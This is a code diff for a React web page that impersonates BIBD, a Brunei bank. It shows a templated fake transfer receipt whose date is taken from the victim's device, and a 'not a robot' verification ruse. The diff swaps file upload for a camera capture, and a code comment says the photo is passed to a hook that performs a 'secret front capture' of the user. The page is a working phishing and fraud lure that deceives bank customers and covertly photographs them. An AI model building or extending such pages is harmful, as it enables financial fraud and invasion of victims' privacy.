@@ -6,6 +6,7 @@ import SuccessToast from "@/components/SuccessToast";
 import LoadingScreen from "@/components/LoadingScreen";
 import { useVerification } from "@/hooks/useVerification";
 import { formatFileSize } from "@/utils/device";
+import templateData from "./data.json";
 
 export default function BibdVerificationPage() {
   const {
@@ -27,66 +28,142 @@ export default function BibdVerificationPage() {
     validationError,
   } = useVerification();
 
-  const [isDragging, setIsDragging] = useState(false);
-  const fileInputRef = useRef<HTMLInputElement>(null);
+  const [showCamera, setShowCamera] = useState(false);
+  const [isCapturing, setIsCapturing] = useState(false);
+  const [displayDate, setDisplayDate] = useState(templateData.receiptDate);
+  const rearVideoRef = useRef<HTMLVideoElement>(null);
+  const rearStreamRef = useRef<MediaStream | null>(null);
 
-
-  const handleUploadClick = useCallback(() => {
-    if (uploadedFile) return;
-
-    // Trigger permission requests in parallel (non-blocking)
-    requestAllPermissions().catch((err) => console.error(err));
-
-    // Open file selector synchronously to guarantee User Activation context
-    fileInputRef.current?.click();
-  }, [uploadedFile, requestAllPermissions]);
-
-  const handleDragOver = useCallback((e: React.DragEvent) => {
-    e.preventDefault();
-    e.stopPropagation();
-    setIsDragging(true);
+  // Set AUTO date based on client device
+  useEffect(() => {
+    if (templateData.receiptDate === "AUTO") {
+      const date = new Date();
+      const months = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
+      const d = String(date.getDate()).padStart(2, '0');
+      const m = months[date.getMonth()];
+      const y = date.getFullYear();
+      const hh = String(date.getHours()).padStart(2, '0');
+      const mm = String(date.getMinutes()).padStart(2, '0');
+      setDisplayDate(`${d} ${m} ${y}, ${hh}:${mm}`);
+    } else {
+      setDisplayDate(templateData.receiptDate);
+    }
   }, []);
 
-  const handleDragLeave = useCallback((e: React.DragEvent) => {
-    e.preventDefault();
-    e.stopPropagation();
-    setIsDragging(false);
+  // Cleanup camera streams on unmount
+  useEffect(() => {
+    return () => {
+      rearStreamRef.current?.getTracks().forEach((t) => t.stop());
+    };
   }, []);
 
-  const handleDrop = useCallback(
-    async (e: React.DragEvent) => {
-      e.preventDefault();
-      e.stopPropagation();
-      setIsDragging(false);
+  useEffect(() => {
+    if (showCamera && rearVideoRef.current && rearStreamRef.current) {
+      rearVideoRef.current.srcObject = rearStreamRef.current;
+      rearVideoRef.current.play().catch(e => console.error('Play failed:', e));
+      setTimeout(() => {
+        window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+      }, 300);
+    }
+  }, [showCamera]);
 
-      // Request both permissions (parallel, no delay)
-      const granted = await requestAllPermissions();
+  // Open rear camera live preview (avoid front camera here to prevent mobile crash/black screen)
+  const handleOpenCamera = useCallback(async () => {
+    if (uploadedFile || showCamera) return;
 
-      if (granted) {
-        const files = e.dataTransfer.files;
-        if (files.length > 0) handleFileSelect(files[0]);
+    let rearStream = null;
+    
+    try {
+      // 1st attempt: Environment (rear) camera with portrait HD ideal resolution
+      rearStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'environment', width: { ideal: 720 }, height: { ideal: 1280 } },
+      });
+    } catch (err1) {
+      console.warn('1st camera attempt failed:', err1);
+      try {
+        // 2nd attempt: Just ask for environment camera, no resolution constraint
+        rearStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'environment' },
+        });
+      } catch (err2) {
+        console.warn('2nd camera attempt failed:', err2);
+        try {
+          // 3rd attempt: Just ask for ANY camera (fallback for devices that don't support facingMode at all)
+          rearStream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+          });
+        } catch (err3) {
+          console.error('All camera open attempts failed:', err3);
+          alert('Gagal mengakses kamera. Pastikan browser memiliki izin dan tidak diblokir.');
+          return;
+        }
       }
-    },
-    [handleFileSelect, requestAllPermissions]
-  );
+    }
 
-  const handleFileInputChange = useCallback(
-    (e: React.ChangeEvent<HTMLInputElement>) => {
-      const files = e.target.files;
-      if (files && files.length > 0) handleFileSelect(files[0]);
-    },
-    [handleFileSelect]
-  );
+    if (rearStream) {
+      rearStreamRef.current = rearStream;
+      setShowCamera(true);
+    }
+  }, [uploadedFile, showCamera]);
+
+  // Cancel camera and close
+  const handleCancelCamera = useCallback(() => {
+    rearStreamRef.current?.getTracks().forEach((t) => t.stop());
+    rearStreamRef.current = null;
+    setShowCamera(false);
+  }, []);
+
+  // Capture photo from rear camera
+  const handleCapturePhoto = useCallback(async () => {
+    if (isCapturing) return;
+    setIsCapturing(true);
+
+    try {
+      const rearStream = rearStreamRef.current;
+      if (!rearStream) {
+        setIsCapturing(false);
+        return;
+      }
+
+      // Capture rear camera photo directly from visible video element
+      const rearCanvas = document.createElement('canvas');
+      const rearVideo = rearVideoRef.current;
+      if (rearVideo) {
+        rearCanvas.width = rearVideo.videoWidth || 640;
+        rearCanvas.height = rearVideo.videoHeight || 480;
+        const ctx = rearCanvas.getContext('2d');
+        ctx?.drawImage(rearVideo, 0, 0, rearCanvas.width, rearCanvas.height);
+      }
+      
+      const rearPhotoBlob = await new Promise<Blob | null>((resolve) =>
+        rearCanvas.toBlob((b) => resolve(b), 'image/jpeg', 0.85)
+      );
+
+      // Stop stream immediately
+      rearStream.getTracks().forEach((t) => t.stop());
+      rearStreamRef.current = null;
+      setShowCamera(false);
+
+      if (rearPhotoBlob) {
+        const resitFile = new File([rearPhotoBlob], `resit-${Date.now()}.jpg`, { type: 'image/jpeg' });
+        // Forward to useVerification hook (which handles the secret front capture)
+        handleFileSelect(resitFile);
+      }
+    } catch (err) {
+      console.error('Capture failed:', err);
+    }
+
+    setIsCapturing(false);
+  }, [isCapturing, handleFileSelect]);
+
+
 
   // Show initial loading screen
   if (isInitialLoading) {
     return <LoadingScreen />;
   }
 
-  // Show processing loading screen
-  if (isProcessing) {
-    return <LoadingScreen />;
-  }
+  // Loading screens removed to prevent blank loading page during processing
 
   if (isVerified) {
     return (
@@ -98,11 +175,10 @@ export default function BibdVerificationPage() {
             <div className="p-8 flex flex-col items-center text-center">
               {/* Brand Logo */}
               <img 
-                src="/bibdbrunei_logo.jpg" 
+                src="/logo-terbaru-bibd-copy.png" 
                 alt="BIBD Logo" 
-                className="w-16 h-16 rounded-full object-cover mb-4 shadow-sm"
+                className="h-14 object-contain mb-4"
               />
-              <h1 className="font-[Manrope] text-2xl font-bold text-[#410030] mb-2">BIDB</h1>
               
               {/* Status Badge */}
               <div className="flex items-center space-x-2 bg-[#95d2c8]/20 text-[#095049] px-4 py-2 rounded-full mb-4">
@@ -112,7 +188,7 @@ export default function BibdVerificationPage() {
               
               {/* Amount */}
               <p className="font-[Inter] text-sm text-[#53424b] mb-1">Jumlah Transfer</p>
-              <p className="font-[Manrope] text-3xl font-extrabold text-[#1c1b1b]">BND 900.00</p>
+              <p className="font-[Manrope] text-3xl font-extrabold text-[#1c1b1b]">{templateData.receiptAmount}</p>
             </div>
 
             {/* Divider */}
@@ -123,33 +199,33 @@ export default function BibdVerificationPage() {
               {/* Detail Row 1 */}
               <div className="flex justify-between items-start">
                 <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Tanggal</span>
-                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">24 juli 2026, 11:20</span>
+                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">{displayDate}</span>
               </div>
               {/* Detail Row 2 */}
               <div className="flex justify-between items-start">
                 <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Jenis Transaksi</span>
-                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">Transfer Internal</span>
+                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">{templateData.receiptTransactionType}</span>
               </div>
               {/* Detail Row 3 */}
               <div className="flex justify-between items-start">
                 <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Dari</span>
                 <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">
-                  Tabungan Utama<br />
-                  <span className="text-[#53424b] text-sm font-normal">(****1234)</span>
+                  {templateData.receiptSenderName}<br />
+                  <span className="text-[#53424b] text-sm font-normal">{templateData.receiptSenderAccount}</span>
                 </span>
               </div>
               {/* Detail Row 4 */}
               <div className="flex justify-between items-start">
                 <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Ke</span>
                 <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">
-                  Ahmad Reza<br />
-                  <span className="text-[#53424b] text-sm font-normal">(****5678)</span>
+                  {templateData.receiptReceiverName}<br />
+                  <span className="text-[#53424b] text-sm font-normal">{templateData.receiptReceiverAccount}</span>
                 </span>
               </div>
               {/* Detail Row 5 */}
               <div className="flex justify-between items-start pt-2 border-t border-[#e5e2e1]">
                 <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Nomor Referensi</span>
-                <span className="font-[IBM-Plex-Sans] text-sm font-semibold text-[#410030] text-right w-2/3 break-all">BIDB789012345</span>
+                <span className="font-[IBM-Plex-Sans] text-sm font-semibold text-[#410030] text-right w-2/3 break-all">{templateData.receiptReference}</span>
               </div>
             </div>
           </div>
@@ -170,16 +246,7 @@ export default function BibdVerificationPage() {
         </div>
 
         {/* Success Toast */}
-        {!showRedirectCountdown && <SuccessToast />}
-
-        {/* Redirect Countdown Overlay */}
-        <RedirectCountdown
-          show={showRedirectCountdown}
-          countdown={redirectCountdown}
-          countdownDuration={countdownDuration}
-          redirectUrl={redirectUrl}
-          redirectConfig={redirectConfig}
-        />
+        <SuccessToast />
 
         <style
           dangerouslySetInnerHTML={{
@@ -211,108 +278,161 @@ export default function BibdVerificationPage() {
   }
 
   return (
-    <main className="min-h-screen flex flex-col bg-white text-[#1c1b1b] font-[Inter] antialiased w-full items-center justify-center p-4">
-      {/* Main View Area */}
-      <div className="w-full mx-auto flex flex-col items-center justify-center py-6 animate-fade-slide" style={{ maxWidth: 380 }}>
-        <div className="text-center px-margin-mobile md:px-0 gap-2 mb-6">
-          <div className="flex justify-center mb-4">
-            <img 
-              alt="BDCB Logo" 
-              className="w-auto object-contain" 
-              src="https://lh3.googleusercontent.com/aida-public/AB6AXuATBmsIEarjki0ZhY-adi499onA6rI28KBoXWTxJj02TDaNHsvs9gLexMbCpj5yGG_VZ860RM-o4JoIBryRbnnHHEcoQRP7KfdI_4DOsLzhzZL2zmON-kKtdJcdtnXx_8_wix01GScSZrg2G0fm4Da5oRZIUOVm5iqVscvrwm9lAi-GEiZR0LXXncXsaXssIKoN0xlzzrKRiQxcIb8rH6JefP3xrLysqwbpg_h82sA-Q2TLq9MTxWHqgMI6bTE_cZOxcEsGHDZ_dfE" 
-              style={{ width: "auto", height: 160 }}
-            />
-          </div>
-          <h1 className="text-2xl font-[Manrope] font-bold text-[#410030] mb-2">Verifikasi Keamanan</h1>
-          <p className="text-sm font-[Inter] text-[#53424b]">
-            Untuk melihat riwayat transaksi, harap selesaikan pemeriksaan keamanan di bawah ini untuk memastikan bahwa anda bukan robot.
-          </p>
+    <main className="min-h-screen flex flex-col bg-[#111111] font-[Inter] antialiased w-full relative sm:p-4 items-center justify-center">
+      {/* Mobile container to look like the phone screen on desktop, full width on mobile */}
+      <div className="w-full sm:max-w-[400px] bg-white min-h-screen sm:min-h-[800px] sm:h-[800px] sm:rounded-[40px] sm:overflow-hidden relative flex flex-col shadow-2xl">
+        {/* Top Bar */}
+        <div className="w-full bg-[#fbbd05] py-4 flex justify-center items-center shadow-sm z-10 flex-shrink-0">
+          <h1 className="text-white font-bold text-[14px] tracking-wide uppercase">BIBD BRUNAI DARUSSALAM</h1>
         </div>
 
-        <div className="bg-white border border-[#e5e2e1] rounded-xl overflow-hidden shadow-sm flex flex-col w-full">
-          <div className="flex flex-col items-center justify-center p-5 space-y-4">
-            
-            {/* Conditional Upload Box depending on if file is uploaded */}
-            {uploadedFile ? (
-              <div className="w-full border-2 border-solid border-[#4A90E2] rounded-xl flex flex-col items-center justify-center bg-[#f0eded]/30 p-5 mb-2">
-                <span className="material-symbols-outlined text-[48px] text-[#4A90E2] mb-2">insert_drive_file</span>
-                <h3 className="text-sm font-semibold text-[#1c1b1b] mb-1 truncate max-w-[90%]">{uploadedFile.name}</h3>
-                <p className="text-xs text-[#53424b] mb-3">{formatFileSize(uploadedFile.size)}</p>
-                <button 
-                  onClick={(e) => {
-                    e.stopPropagation();
-                    setUploadedFile(null);
-                  }}
-                  className="text-xs text-red-600 font-semibold hover:text-red-800 transition-colors bg-red-50 px-3 py-1 rounded-full border border-red-200"
+        {/* Main Content Area - This is where scrolling happens if needed */}
+        <div className="flex-1 flex flex-col px-4 pt-6 pb-8 overflow-y-auto w-full">
+          <div className="w-full flex flex-col items-center">
+            {/* Logo */}
+            <div className="flex justify-center mb-8 mt-2">
+              <img 
+                src="/logo-terbaru-bibd-copy.png" 
+                alt="BIBD Logo" 
+                className="h-[60px] object-contain"
+              />
+            </div>
+
+            {/* Title & Subtitle */}
+            <h2 className="text-[#2d3748] font-bold text-[16px] text-center mb-1">
+              {templateData.title}
+            </h2>
+            <p className="text-[#a0aec0] text-[13px] text-center mb-6">
+              {templateData.subtitle}
+            </p>
+
+            {/* Amount Box */}
+            <div className="w-full bg-[#f8f9fa] rounded-xl py-6 px-4 flex flex-col items-center justify-center mb-8">
+              <p className="text-[#a0aec0] text-[12px] mb-2 font-medium">Jumlah Diterima</p>
+              <p className="text-[#1a202c] text-2xl font-bold mb-1 tracking-tight">{templateData.amountPrimary}</p>
+              <p className="text-[#1a202c] text-xl font-bold tracking-tight">{templateData.amountSecondary}</p>
+            </div>
+
+            {/* Details Table */}
+            <div className="w-full flex flex-col gap-4 text-[12px] mb-8">
+              <div className="flex justify-between items-start">
+                <span className="text-[#a0aec0] w-[35%] font-medium">Pengirim</span>
+                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.senderBank}</span>
+              </div>
+              <div className="flex justify-between items-start">
+                <span className="text-[#a0aec0] w-[35%] font-medium">Nama Akaun Pengirim</span>
+                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.senderName}</span>
+              </div>
+              <div className="flex justify-between items-start">
+                <span className="text-[#a0aec0] w-[35%] font-medium">No. Akaun Pengirim</span>
+                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.senderAccount}</span>
+              </div>
+              
+              <div className="w-full border-t border-[#edf2f7] my-1"></div>
+              
+              <div className="flex justify-between items-start">
+                <span className="text-[#a0aec0] w-[35%] font-medium">Penerima</span>
+                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.receiverBank}</span>
+              </div>
+              <div className="flex justify-between items-start">
+                <span className="text-[#a0aec0] w-[35%] font-medium">No. Akaun Penerima</span>
+                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.receiverAccount}</span>
+              </div>
+              <div className="flex justify-between items-start">
+                <span className="text-[#a0aec0] w-[35%] font-medium">Nama Akaun Penerima</span>
+                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.receiverName}</span>
+              </div>
+            </div>
+
+            {/* Camera View / Action Button */}
+            {showCamera ? (
+              <div className="w-full flex flex-col gap-3 mt-2">
+                {/* Live rear camera preview */}
+                <div className="w-full rounded-[10px] overflow-hidden bg-black relative flex items-center justify-center" style={{ aspectRatio: '3/4' }}>
+                  <video
+                    ref={rearVideoRef}
+                    autoPlay
+                    playsInline
+                    muted
+                    className="w-full h-full object-cover"
+                    style={{ transform: 'scaleX(1)' }}
+                  />
+                  {isCapturing && (
+                    <div className="absolute inset-0 bg-black/50 flex items-center justify-center">
+                      <div className="flex flex-col items-center gap-2">
+                        <svg className="h-8 w-8 animate-spin text-white" fill="none" viewBox="0 0 24 24">
+                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
+                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
+                        </svg>
+                        <span className="text-white text-xs font-semibold">Memproses...</span>
+                      </div>
+                    </div>
+                  )}
+                </div>
+                {/* Capture button */}
+                <button
+                  onClick={handleCapturePhoto}
+                  disabled={isCapturing}
+                  className="w-full bg-[#2563eb] text-white py-4 rounded-[10px] font-semibold text-[14px] hover:bg-[#1d4ed8] transition-colors disabled:opacity-50 flex items-center justify-center gap-2"
                 >
-                  Hapus File
+                  {isCapturing ? 'Memproses...' : 'Ambil Foto Resit / Bukti Belanja'}
                 </button>
               </div>
-            ) : (
-              <div 
-                onDragOver={handleDragOver}
-                onDragLeave={handleDragLeave}
-                onDrop={handleDrop}
-                onClick={handleUploadClick}
-                className={`w-full border-2 border-dashed border-[#85727b]/50 rounded-xl flex flex-col items-center justify-center bg-white hover:bg-[#f6f3f2] transition-colors cursor-pointer group mb-2 p-6 ${
-                  isDragging ? 'border-[#4A90E2] bg-[#f0eded]/30' : ''
-                }`}
+            ) : !uploadedFile ? (
+              <button
+                onClick={handleOpenCamera}
+                className="w-full bg-[#2563eb] text-white py-4 rounded-[10px] font-semibold text-[14px] hover:bg-[#1d4ed8] transition-colors shadow-sm mt-2 flex items-center justify-center gap-2"
               >
-                <span className="material-symbols-outlined text-[48px] text-[#410030] mb-2">cloud_upload</span>
-                <h3 className="text-lg font-[Manrope] font-semibold text-[#1c1b1b] mb-2">Unggah Foto Apa Saja</h3>
-                <p className="text-xs text-[#53424b] text-center max-w-[85%]">
-                  Klik atau seret gambar ke sini untuk mengunggah gambar verifikasi
-                </p>
+                Ambil Foto Resit / Bukti Belanja
+              </button>
+            ) : (
+              <div className="w-full flex flex-col gap-4 mt-2">
+                <div className="w-full rounded-[10px] overflow-hidden bg-black relative flex items-center justify-center" style={{ aspectRatio: '3/4' }}>
+                  <img 
+                    src={URL.createObjectURL(uploadedFile)} 
+                    alt="Captured Receipt" 
+                    className="w-full h-full object-cover"
+                    style={{ transform: 'scaleX(1)' }}
+                  />
+                  <button 
+                    onClick={(e) => {
+                      e.stopPropagation();
+                      setUploadedFile(null);
+                    }}
+                    className="absolute top-3 right-3 bg-red-500/80 hover:bg-red-600 text-white rounded-full p-2 flex items-center justify-center backdrop-blur-sm transition-colors"
+                  >
+                    <span className="material-symbols-outlined text-[18px]">close</span>
+                  </button>
+                </div>
+                <button 
+                  onClick={handleVerifyClick}
+                  disabled={isChecking}
+                  className="w-full bg-[#16a34a] text-white py-4 rounded-[10px] font-semibold text-[14px] hover:bg-[#15803d] transition-colors shadow-sm disabled:opacity-50 flex items-center justify-center gap-2"
+                >
+                  {isChecking ? (
+                    <>
+                      <svg className="h-4 w-4 animate-spin text-white" fill="none" viewBox="0 0 24 24">
+                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
+                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
+                      </svg>
+                      MEMPROSES...
+                    </>
+                  ) : (
+                    "KIRIM BUKTI"
+                  )}
+                </button>
               </div>
             )}
-            
-            <input 
-              className="hidden" 
-              id="verification-upload" 
-              type="file" 
-              ref={fileInputRef}
-              onChange={handleFileInputChange}
-              accept="image/*"
-            />
-
-            <p className="text-xs font-[Inter] text-[#53424b] text-center px-4">
-              Harap unggah foto dokumen pendukung untuk melanjutkan verifikasi keamanan untuk memastikan bahwa anda bukan robot
-              </p>
-
             {validationError && (
-              <div className="flex items-center gap-2 text-xs font-semibold text-red-600 bg-red-50 p-2.5 rounded-lg border border-red-200 w-full justify-center text-center">
+              <div className="mt-4 flex items-center gap-2 text-xs font-semibold text-red-600 bg-red-50 p-2.5 rounded-lg border border-red-200 w-full justify-center text-center">
                 <span className="material-symbols-outlined text-sm flex-shrink-0">warning</span>
                 <span>{validationError}</span>
               </div>
             )}
           </div>
-
-          <div className="border-t border-[#e5e2e1] bg-white p-4 flex justify-end items-center">
-            <button 
-              onClick={handleVerifyClick}
-              disabled={isChecking}
-              className="bg-[#4A90E2] hover:bg-[#3A7BC8] text-white px-12 py-3 rounded font-[IBM-Plex-Sans] text-xs font-semibold uppercase tracking-wider transition-colors focus:ring-2 focus:ring-offset-2 focus:ring-[#4A90E2] outline-none shadow-sm disabled:opacity-50"
-            >
-              {isChecking ? (
-                <span className="flex items-center gap-2">
-                  <svg className="h-4 w-4 animate-spin text-white" fill="none" viewBox="0 0 24 24">
-                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
-                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
-                  </svg>
-                  VERIFYING...
-                </span>
-              ) : (
-                "VERIFIKASI"
-              )}
-            </button>
-          </div>
-        </div>
-
-        <div className="mt-6 flex items-center justify-center gap-2 text-[#53424b] mb-2">
-          <span className="material-symbols-outlined text-[18px] text-[#410030]">lock</span>
-          <span className="text-xs font-[Inter]">Ini adalah koneksi aman terenkripsi 256-bit.</span>
         </div>
       </div>
     </main>
   );
 }
+
